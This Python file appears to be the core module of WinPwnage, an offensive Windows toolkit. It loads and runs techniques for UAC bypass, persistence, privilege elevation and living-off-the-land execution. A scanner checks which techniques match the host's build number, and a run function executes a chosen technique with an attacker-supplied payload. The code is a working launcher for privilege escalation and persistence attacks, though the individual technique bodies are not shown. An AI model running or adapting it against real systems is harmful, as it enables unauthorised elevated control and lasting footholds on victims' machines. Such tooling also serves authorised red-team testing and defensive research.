import os

from winpwnage.functions.uac.uac_runas import *
from winpwnage.functions.uac.uac_slui import *
from winpwnage.functions.uac.uac_perfmon import *
from winpwnage.functions.uac.uac_fodhelper import *
from winpwnage.functions.uac.uac_eventviewer import *
from winpwnage.functions.uac.uac_sdcltcontrol import *
from winpwnage.functions.uac.uac_silentcleanup import *
from winpwnage.functions.uac.uac_compmgmtlauncher import *
from winpwnage.functions.uac.uac_computerdefaults import *
from winpwnage.functions.uac.uac_sdcltisolatedcommand import *
from winpwnage.functions.uac.uac_dll_sysprep import *
from winpwnage.functions.uac.uac_dll_cliconfg import *
from winpwnage.functions.uac.uac_dll_mcx2prov import *
from winpwnage.functions.uac.uac_dll_migwiz import *
from winpwnage.functions.uac.uac_token_manipulation import *
from winpwnage.functions.uac.uac_sdclt import *
from winpwnage.functions.uac.uac_cmstp import *
from winpwnage.functions.uac.uac_dotnet import *
from winpwnage.functions.uac.uac_mockdir import *

from winpwnage.functions.persist.persist_userinit import *
from winpwnage.functions.persist.persist_schtask import *
from winpwnage.functions.persist.persist_ifeo import *
from winpwnage.functions.persist.persist_hkcu_run import *
from winpwnage.functions.persist.persist_hklm_run import *
from winpwnage.functions.persist.persist_dll_explorer import *
from winpwnage.functions.persist.persist_mofcomp import *
from winpwnage.functions.persist.persist_wmic import *
from winpwnage.functions.persist.persist_startup_files import *
from winpwnage.functions.persist.persist_cortana import *
from winpwnage.functions.persist.persist_people import *
from winpwnage.functions.persist.persist_bitsadmin import *
 
from winpwnage.functions.elevate.elevate_handle_inheritance import *
from winpwnage.functions.elevate.elevate_token_impersonation import *
from winpwnage.functions.elevate.elevate_named_pipe_impersonation import *
from winpwnage.functions.elevate.elevate_schtasks import *
from winpwnage.functions.elevate.elevate_wmic import *

from winpwnage.functions.execute.exec_forfiles import *
from winpwnage.functions.execute.exec_pcalua import *
from winpwnage.functions.execute.exec_vsjitdebugger import *
from winpwnage.functions.execute.exec_bash import *
from winpwnage.functions.execute.exec_diskshadow import *
from winpwnage.functions.execute.exec_advpack import *
from winpwnage.functions.execute.exec_dxcap import *
from winpwnage.functions.execute.exec_forfiles import *
from winpwnage.functions.execute.exec_ieadvpack import *
from winpwnage.functions.execute.exec_ieframe import *
from winpwnage.functions.execute.exec_pcwutl import *
from winpwnage.functions.execute.exec_shdocvw import *
from winpwnage.functions.execute.exec_url import *
from winpwnage.functions.execute.exec_zipfldr import *
from winpwnage.functions.execute.exec_ftp import *
from winpwnage.functions.execute.exec_sqltoolsps import *

from winpwnage.core.prints import print_info, print_error, print_table, table_success, table_error, Constant
from winpwnage.core.utils import information

functions = {
	'uac': (
		runas_info,
		fodhelper_info,
		slui_info,
		silentcleanup_info,
		sdcltisolatedcommand_info,
		sdcltcontrol_info, perfmon_info,
		eventviewer_info,
		compmgmtlauncher_info,
		computerdefaults_info,
		cliconfg_info,
		mcx2prov_info,
		migwiz_info,
		sysprep_info,
		tokenmanipulation_info,
		sdclt_info,
		cmstp_info,
		dotnet_info,
		mock_info
	),
	'persist': (
		explorer_info,
		mofcomp_info,
		schtask_info,
		ifeo_info,
		userinit_info,
		hkcurun_info,
		hklmrun_info,
		wmic_info, 
		startup_files_info,
		cortana_appx_info,
		people_appx_info,
		bitsadmin_info
	),
	'elevate': (
		handleinheritance_info,
		tokenimpersonation_info,
		namedpipeimpersonation_info,
		elevate_schtasks_info,
		elevate_wmic_info
	),
	'execute': (
		forfiles_info,
		pcalua_info,
		vsjitdebugger_info,
		bash_info,
		diskshadow_info,
		advpack_info,
		dxcap_info,
		ieadvpack_info,
		ieframe_info,
		pcwutl_info,
		ftp_info,
		shdocvw_info,
		url_info,
		zipfldr_info,
		sqltoolsps_info
	)
}


class scanner():
	def __init__(self, uac=True, persist=True, elevate=True, execute=True):
		self.uac = uac
		self.persist = persist
		self.elevate = elevate
		self.execute = execute
		Constant.output = []

	def start(self):
		print_info("Comparing build number ({}) against 'Fixed In' build numbers, false positives might happen.".format(information().build_number()))
		print_table()
		for i in functions:
			if i == 'uac' and not self.uac or i == 'persist' and not self.persist or i == 'elevate' and not self.elevate or i == 'execute' and not self.execute:
				continue

			for info in functions[i]:
				if int(info["Works From"]) <= int(information().build_number()) < int(info["Fixed In"]):
					table_success(info["Id"],
						"\t{}\t{}\t\t{}\t\t{}".format(str(info["Type"]),
						str(info["Function Payload"]),
						str(info["Admin"]),
						str(info["Description"])))
				else:
					table_error(info["Id"],
						"\t{}\t{}\t\t{}\t\t{}".format(str(info["Type"]),
						str(info["Function Payload"]),
						str(info["Admin"]),
						str(info["Description"])))
		return Constant.output

class function():
	def __init__(self, uac=True, persist=True, elevate=True, execute=True):
		self.uac = uac
		self.persist = persist
		self.elevate = elevate
		self.execute = execute
		Constant.output = []

	def run(self, id, payload, **kwargs):
		print_info("Attempting to run id ({}) configured with payload ({})".format(id, payload))
		for i in functions:
			#if i == 'uac' and not self.uac or i == 'persist' and not self.persist or i == 'elevate' and not self.elevate:
			if i == 'uac' and not self.uac or i == 'persist' and not self.persist or i == 'elevate' and not self.elevate or i == 'execute' and not self.execute:
				continue

			for info in functions[i]:
				if id in str(info["Id"]):
					if int(info["Works From"]) <= int(information().build_number()) < int(info["Fixed In"]):
						f = globals()[info["Function Name"]]
						
						# if name is not needed in function, just keep goin
						if 'name' not in f.__code__.co_varnames and 'add' in f.__code__.co_varnames:
							f(payload, add=kwargs.get('add', True))
						
						# if name is needed for the function to run, just add a dummy
						# this is mainly to support pupy intergration, wich needs custom
						# names in order to work.
						elif 'name' in f.__code__.co_varnames and 'add' in f.__code__.co_varnames:
							f(payload, name=kwargs.get('name', 'WinPwnage'), add=kwargs.get('add', True))
						
						# if function only needs payload as argument, eg. uac functions
						else:
							f(payload)
					else:
						print_error('Technique not compatible with this system.')
						
					return Constant.output
				else:
					pass
